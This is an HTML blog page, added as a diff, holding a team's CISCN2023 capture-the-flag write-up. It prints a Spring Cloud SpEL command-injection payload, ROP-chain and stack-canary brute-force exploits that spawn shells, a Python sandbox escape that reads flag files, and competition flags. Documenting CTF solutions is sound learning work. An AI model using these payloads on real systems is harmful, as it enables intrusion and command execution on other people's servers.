@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">CISCN2023 wp</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/05/29 22:04:10</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="战队答题情况"><a href="#战队答题情况" class="headerlink" title="战队答题情况"></a>战队答题情况</h1><h2 id="排名：282"><a href="#排名：282" class="headerlink" title="排名：282"></a>排名：282</h2><p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368785969-9737117c-25d9-4a53-a14f-96b88afe88c2.png" alt="a6f287c23150ba48b360dcc75e6c0b0.png"></p>
+<h2 id="解题列表"><a href="#解题列表" class="headerlink" title="解题列表"></a>解题列表</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
+<li>BackendService</li>
+</ul>
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><ul>
+<li>烧烤摊儿 </li>
+<li>funcanary</li>
+</ul>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><ul>
+<li>签到卡 </li>
+<li>pyshell </li>
+<li>网络安全人才实战能力评价现状调查问卷</li>
+</ul>
+<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><ul>
+<li>babyRE </li>
+<li>ezAndroid</li>
+</ul>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><ul>
+<li>基于国密SM2算法的密钥密文分发 </li>
+<li>Sign_in_passwd</li>
+</ul>
+<hr>
+<h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>在nacos权限绕过漏洞，网上找了一个payload<br>nacos抓包，修改返回包中参数，登录<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685266452751-28fda1ed-0ad2-4eee-af5b-1ddf328b434c.png" alt="image.png"><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493#toc-5">https://xz.aliyun.com/t/11493#toc-5</a><br>对源码进行审计发现springcloud3.05 spel注入漏洞，在新建配置文件，名为backcfg</p>
+<pre class="language-php" data-language="php"><code class="language-php">&#123;
+  &quot;spring&quot;: &#123;
+    &quot;cloud&quot;: &#123;
+      &quot;gateway&quot;: &#123;
+        &quot;routes&quot;: [
+          &#123;
+            &quot;id&quot;: &quot;exam&quot;,
+            &quot;order&quot;: 0,
+            &quot;uri&quot;: &quot;lb:&#x2F;rvice-provider&quot;,
+            &quot;predicates&quot;: [
+              &quot;Path&#x3D;&#x2F;echo&#x2F;**&quot;
+            ],
+            &quot;filters&quot;: [
+              &#123;
+                &quot;name&quot;: &quot;AddResponseHeader&quot;,
+                &quot;args&quot;: &#123;
+                  &quot;name&quot;: &quot;result&quot;,
+                  &quot;value&quot;: &quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#39;id&#39;&#125;).getInputStream())).replaceAll(&#39;\n&#39;,&#39;&#39;).replaceAll(&#39;\r&#39;,&#39;&#39;)&#125;&quot;
+                &#125;
+              &#125;
+            ]
+          &#125;
+        ]
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>利用curl外带flag即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685268408418-725f086c-ecf3-4b0c-ba3a-ab2b4af493db.png" alt="image.png"></p>
+<h1 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="27日-烧烤摊儿"><a href="#27日-烧烤摊儿" class="headerlink" title="27日_烧烤摊儿"></a>27日_烧烤摊儿</h2><p>本地执行发现买东西是如果输入负数会给自己加钱，然后买下店铺，改名，发现存在栈溢出，试出溢出为0x28，因为是静态，所以用ROPgadget –binary shaokao –ropchain可以获得payload，只需要填偏移即可。<br>exp：</p>
+<pre class="language-python" data-language="python"><code class="language-python">from pwn import *
+from LibcSearcher import *
+from struct import pack
+
+context.log_level&#x3D;&#39;debug&#39;
+
+#io&#x3D;remote()
+io&#x3D;process(&#39;.&#x2F;shaokao&#39;)
+
+elf&#x3D;ELF(&#39;.&#x2F;shaokao&#39;)
+
+io.recvuntil(&quot;&gt; &quot;)
+io.sendline(&quot;1&quot;)
+io.recv()
+io.sendline(&quot;1&quot;)
+io.recv()
+io.sendline(&quot;-1000000&quot;)
+io.recv()
+io.sendline(&quot;4&quot;)
+io.recv()
+io.sendline(&quot;5&quot;)
+
+# Padding goes here
+p &#x3D; b&#39;a&#39;*0x28
+
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .data
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; ret
+p +&#x3D; b&#39;&#x2F;bin&#x2F;&#x2F;sh&#39;
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .data
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x4141414141414141) # padding
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscall
+
+print(len(p))
+
+io.sendline(p)
+io.interactive()</code></pre>
+<h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><ul>
+<li>利用fork无限创建子进程去爆破出canary，最后利用穷举去partial write从而绕过pie<pre class="language-none"><code class="language-none">from pwn import *
+context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)
+
+local &#x3D; 0
+elf &#x3D; ELF(&#39;.&#x2F;funcanary&#39;)
+#gdb.attach(p)
+if local:
+    p &#x3D; process(&#39;.&#x2F;funcanary&#39;)
+    libc &#x3D; elf.libc
+
+else:
+    p &#x3D; remote(&#39;47.94.206.10&#39;,29297)
+   # libc &#x3D; ELF(&#39;.&#x2F;&#39;)
+p.recvuntil(&#39;welcome\n&#39;)
+canary &#x3D; b&#39;\x00&#39;
+for k in range(7):
+    for i in range(256):
+        print (&quot;the &quot; + str(k) + &quot;: &quot; + str(i))
+        p.send(b&#39;a&#39;*0x68 + canary + p8(i))
+        a &#x3D; p.recvuntil(&quot;welcome\n&quot;)
+        print (a)
+        if &quot;fun&quot; in str(a):
+                canary +&#x3D; p8(i)
+                print(&#39;canary:&#39;)
+                print(canary)
+                break
+                
+print(canary)
+target&#x3D;0x1228
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x02&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x12&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x22&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x32&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x42&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x52&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x62&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x72&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x82&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x92&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xa2&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xb2&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xc2&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xd2&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xe2&#39;
+p.send(payload)
+p.recv()
+payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xf2&#39;
+p.send(payload)
+
+p.interactive()
+</code></pre></li>
+</ul>
+<h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h1><h2 id="27-签到卡"><a href="#27-签到卡" class="headerlink" title="27_签到卡"></a>27_签到卡</h2><p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266137154-e562de8e-145a-4c53-9ba4-1d691c3b6c0a.png" alt="image.png"><br>把&#x2F;etc&#x2F;passwd改为&#x2F;flag即可<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266206911-f3dfffcb-b96c-4bfc-9c6c-8bbaa548aa14.png" alt="image.png"></p>
+<h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>nc到远端，发现输入什么命令都是nop，但是字符串可以回显，但是长度还有所限制，用“_”拼接（“_”可以表示上一次执行的结果），再用“+”拼接成一条字符串表达式，用eval()函数执行</p>
+<pre class="language-python" data-language="python"><code class="language-python">&#39;__imp&#39;
+#&#39;__imp&#39;
+_+&#39;ort&#39;
+#&#39;__import&#39;
+_+&#39;__(&#39;
+#&#39;__import__(&#39;
+_+&quot;&#39;os&quot;
+#&quot;__import__(&#39;os&quot;
+_+&quot;&#39;).&quot;
+#&quot;__import__(&#39;os&#39;).&quot;
+_+&quot;sys&quot;
+#&quot;__import__(&#39;os&#39;).sys&quot;
+_+&quot;tem&quot;
+#&quot;__import__(&#39;os&#39;).system&quot;
+_+&quot;(&#39;c&quot;
+#&quot;__import__(&#39;os&#39;).system(&#39;c&quot;
+_+&quot;at &quot;
+#&quot;__import__(&#39;os&#39;).system(&#39;cat &quot;
+_+&quot;&#x2F;f*&quot;
+#&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;f*&quot;
+_+&quot;&#39;)&quot;
+#&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;f*&#39;)&quot;
+eval(_)
+</code></pre>
+<h2 id="网络安全人才实战能力评价现状调查问卷"><a href="#网络安全人才实战能力评价现状调查问卷" class="headerlink" title="网络安全人才实战能力评价现状调查问卷"></a>网络安全人才实战能力评价现状调查问卷</h2><p>交完问卷出flag</p>
+<h1 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>先打开看看，xml不是很懂，google了一下<a target="_blank" rel="noopener" href="https://snap.berkeley.edu/">snap</a>这个网站用法，打开这个网站导入xml。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574488-88897496-5683-4038-a914-e540254aaf7f.png" alt="image.png"><br>跟着步骤走，点击绿旗子按空格开始<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574961-d96409ba-4664-4b49-903b-49da9aa9f548.png" alt="image.png"><br>运行到lock这里提示输入flag，看到lock的控件里面有多个插入数字操作，应该是密文<br>提取出来得到<code>[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575470-1a7f2707-9427-480a-bae4-b585f92cb8fb.png" alt="image.png"><br>加密逻辑在右边，是各项异或<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574439-63fef859-1b6e-4212-a653-8a2d0970e8d0.png" alt="image.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="language-python" data-language="python"><code class="language-python"># babyRE
+flag&#x3D;[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]
+for i in range(1,len(flag)):
+    flag[i]&#x3D;flag[i] ^ flag[i-1]
+for i in range(0,len(flag)):
+    print(chr(flag[i]),end&#x3D;&quot;&quot;)</code></pre>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</code></p>
+<h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>登录网站试了一下注入好像不行<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574338-83b939d1-02c4-479d-a841-af1c58f9c8af.png" alt="image.png"><br>提示说是找附件漏洞，那就找呗，一堆apk里面就cpweb.apk最可疑<br>用jadx-gui打开，查看一下。先搜索MainActivity，但是好像没啥有用的东西<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575624-7f32685f-51c9-4514-aba5-500a2d98f94b.png" alt="image.png"><br>但是跟MainActivity同目录下有好多个Server，猜测漏洞可能就出在这里，重点看了一下WebServer<br>这里有个路径穿越拼接，应该可以利用这个漏洞。请队里的web手抓包一下。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575781-1972b843-34d4-4d88-8fe1-df65ec45b035.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685269052746-fa0d3dab-1e41-4f3a-a1d2-92ea55c9b64d.png" alt="image.png"></p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;15131359-6d71-45d3-b2ad-73e2f2335a7c&#125;</code></p>
